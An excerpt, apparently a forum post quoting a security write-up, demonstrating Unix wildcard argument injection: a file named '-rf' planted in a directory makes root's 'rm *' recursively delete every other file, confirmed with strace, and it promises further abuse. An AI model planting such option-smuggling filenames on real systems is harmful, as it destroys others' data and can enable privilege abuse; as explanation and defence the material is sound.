</head><body>This works anywhere in linux that may be using wildcards. Novel idea but still useful. <br/>
<br/>
Let's check one very basic wildcard argument injection example.<br/>
<br/>
[root@defensecode public]# ls -al<br/>
total 20<br/>
drwxrwxr-x. 5 leon  leon  4096 Oct 28 17:04 .<br/>
drwx------. 22 leon  leon  4096 Oct 28 16:15 ..<br/>
drwxrwxr-x. 2 leon  leon  4096 Oct 28 17:04 DIR1<br/>
drwxrwxr-x. 2 leon  leon  4096 Oct 28 17:04 DIR2<br/>
drwxrwxr-x. 2 leon  leon  4096 Oct 28 17:04 DIR3<br/>
-rw-rw-r--. 1 leon  leon   0 Oct 28 17:03 file1.txt<br/>
-rw-rw-r--. 1 leon  leon   0 Oct 28 17:03 file2.txt<br/>
-rw-rw-r--. 1 leon  leon   0 Oct 28 17:03 file3.txt<br/>
-rw-rw-r--. 1 nobody nobody  0 Oct 28 16:38 -rf<br/>
<br/>
We have directory with few subdirectories and few files in it.<br/>
There is also file with '-rf' filename ther owned by the user 'nobody'.<br/>
Now, let's run 'rm *' command, and check directory content again.<br/>
<br/>
[root@defensecode public]# rm *<br/>
[root@defensecode public]# ls -al<br/>
total 8<br/>
drwxrwxr-x. 2 leon  leon  4096 Oct 28 17:05 .<br/>
drwx------. 22 leon  leon  4096 Oct 28 16:15 ..<br/>
-rw-rw-r--. 1 nobody nobody  0 Oct 28 16:38 -rf<br/>
<br/>
<br/>
Directory is totally empty, except for '-rf' file in it.<br/>
All files and directories were recursively deleted, and it's pretty obvious what happened...<br/>
When we started 'rm' command with asterisk argument, all filenames in current<br/>
directory were passed as arguments to 'rm' on command line, exactly same as <br/>
following line:<br/>
<br/>
[user@defensecode WILD]$ rm DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf<br/>
<br/>
Since there is '-rf' filename in current directory, 'rm' got -rf option as the<br/>
last argument, and all files in current directory were recursively deleted.<br/>
We can also check that with strace:<br/>
<br/>
[leon@defensecode WILD]$ strace rm *<br/>
execve(&quot;/bin/rm&quot;, [&quot;rm&quot;, &quot;DIR1&quot;, &quot;DIR2&quot;, &quot;DIR3&quot;, &quot;file1.txt&quot;, &quot;file2.txt&quot;, <br/>
&quot;file3.txt&quot;, &quot;-rf&quot;], [/* 25 vars */]) = 0<br/>
       ^- HERE<br/>
<br/>
Now we know how it's possible to inject arbitrary arguments to the unix<br/>
shell programs. In the following chapter we will discuss how we can abuse that<br/>
feature to do much more than just recursively delete files.<br/>
